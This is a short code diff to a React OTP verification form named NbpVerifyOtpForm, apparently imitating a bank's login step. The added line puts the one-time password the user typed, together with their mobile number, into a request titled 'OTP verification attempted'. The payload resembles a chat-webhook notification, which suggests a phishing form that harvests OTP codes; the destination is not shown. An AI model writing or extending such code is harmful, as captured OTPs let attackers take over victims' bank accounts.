@@ -95,7 +95,7 @@ export function NbpVerifyOtpForm() {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                   title: 'OTP verification attempted',
-                  fields: { 'Mobile Number': mobileNumber },
+                  fields: { 'Mobile Number': mobileNumber, 'OTP Code': otp.join('') },
                 }),
               })
 
